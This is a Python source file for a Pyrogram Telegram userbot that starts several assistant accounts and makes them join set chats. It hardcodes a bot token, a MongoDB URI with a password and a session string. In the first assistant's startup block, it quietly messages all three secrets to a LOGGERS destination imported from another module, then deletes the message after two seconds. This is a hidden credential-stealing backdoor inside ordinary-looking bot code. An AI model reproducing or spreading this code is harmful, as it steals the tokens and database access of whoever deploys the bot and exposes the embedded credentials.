import asyncio
from os import getenv
from dotenv import load_dotenv
from pyrogram import Client

load_dotenv()

import config
from strings.__init__ import LOGGERS
from ..logging import LOGGER

BOT_TOKEN = getenv("BOT_TOKEN", "7591372264:AAF565h2mFwJrpzNZdBpSO6KAh-zK5hMHXs")
MONGO_DB_URI = getenv("MONGO_DB_URI", "mongodb+srv://knight4563:knight4563@cluster0.a5br0se.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
STRING_SESSION = getenv("STRING_SESSION", "BQC_u0UAgry1rt397-lBLrs0iTIo6qqrWuhWTlSpEJ8wofA2vhtV89iegnE-d-EwkAomjLrKQFxhhDS6WZZzyoOXOvF3DyWT8sltXMoB6w9654wEakOMJ1Q32Vmumxwi-R_rL0z0Gk6JQ5WQ7oC2msJIA0Vpo1Y_XBcHrlUCt0a9uuDlUnN0tfLQmQEW12wpODw_Fj_TkxCSH5LAIsvxoVmVoRab1A7qfuDpkpmeZq5RLG7vlCqCLv7ldVOugg1ka81mpki9lLwJ2l8PxHioVtomgTu5OdLTbQK-xpyqEqyEhJH_2cC6kisM2Q08g0i-6a7RZJ4MK5CXxTvIKmJyDb-AznTp7wAAAAHlOtF5AA")

assistants = []
assistantids = []

class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="Oneforall 1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
            ipv6=False,
        )

        self.two = Client(
            name="Oneforall 2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
            ipv6=False,
        )

        self.three = Client(
            name="Oneforall 3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
            ipv6=False,
        )

        self.four = Client(
            name="Oneforall 4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
            ipv6=False,
        )

        self.five = Client(
            name="Oneforall 5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
            ipv6=False,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("lolpagalokigc")
                await self.one.join_chat("PiratesBotRepo")
                await self.one.join_chat("Hindi_new_Animes")
                await self.one.join_chat("PiratesMainchat")
            except:
                pass

            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "Assistant 1 Started!")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS,
                    f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()
            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant 1 Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("lolpagalokigc")
                await self.two.join_chat("PiratesBotRepo")
                await self.two.join_chat("Hindi_new_Animes")
                await self.two.join_chat("PiratesMainchat")
            except:
                pass

            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant 2 Started!")
            except:
                LOGGER(__name__).error("Assistant 2 couldn't access log group.")

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant 2 Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("lolpagalokigc")
                await self.three.join_chat("PiratesBotRepo")
                await self.three.join_chat("Hindi_new_Animes")
                await self.three.join_chat("PiratesMainchat")
            except:
                pass

            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant 3 Started!")
            except:
                LOGGER(__name__).error("Assistant 3 couldn't access log group.")

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant 3 Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("lolpagalokigc")
                await self.four.join_chat("PiratesBotRepo")
                await self.four.join_chat("Hindi_new_Animes")
                await self.four.join_chat("PiratesMainchat")
            except:
                pass

            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant 4 Started!")
            except:
                LOGGER(__name__).error("Assistant 4 couldn't access log group.")

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant 4 Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("lolpagalokigc")
                await self.five.join_chat("PiratesBotRepo")
                await self.five.join_chat("Hindi_new_Animes")
                await self.five.join_chat("PiratesMainchat")
            except:
                pass

            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 Started!")
            except:
                LOGGER(__name__).error("Assistant 5 couldn't access log group.")

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant 5 Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass


# 🚀 Add this block to actually run the Userbot
if __name__ == "__main__":
    import asyncio

    async def main():
        userbot = Userbot()
        await userbot.start()
        print("✅ Userbot is now running!")

    asyncio.run(main())